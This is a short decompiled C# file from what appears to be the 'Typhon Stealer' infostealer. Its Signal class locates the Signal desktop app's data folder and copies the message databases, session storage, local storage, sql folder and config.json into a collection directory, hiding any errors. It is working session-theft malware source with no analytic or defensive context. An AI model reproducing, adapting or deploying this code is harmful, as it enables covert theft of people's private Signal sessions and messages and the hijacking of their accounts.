using System;
using System.IO;
using Typhon.Modules.Miscellaneous;

namespace Typhon.Stealer.Software.Messaging
{
	// Token: 0x02000019 RID: 25
	internal class Signal
	{
		// Token: 0x0600006C RID: 108 RVA: 0x00004EEC File Offset: 0x000030EC
		public static void GetSession(string sSavePath)
		{
			if (!Directory.Exists(Signal.SignalPath))
			{
				return;
			}
			string str = Path.Combine(sSavePath, "Signal");
			string originalDirPath = Path.Combine(Signal.SignalPath, "databases");
			string originalDirPath2 = Path.Combine(Signal.SignalPath, "Session Storage");
			string originalDirPath3 = Path.Combine(Signal.SignalPath, "Local Storage");
			string originalDirPath4 = Path.Combine(Signal.SignalPath, "sql");
			try
			{
				IOHelper.CopyDirectory(originalDirPath, str + "\\databases");
				IOHelper.CopyDirectory(originalDirPath2, str + "\\Session Storage");
				IOHelper.CopyDirectory(originalDirPath3, str + "\\Local Storage");
				IOHelper.CopyDirectory(originalDirPath4, str + "\\sql");
				File.Copy(Signal.SignalPath + "\\config.json", str + "\\config.json");
			}
			catch
			{
			}
		}

		// Token: 0x0400003B RID: 59
		private static readonly string SignalPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Signal");
	}
}
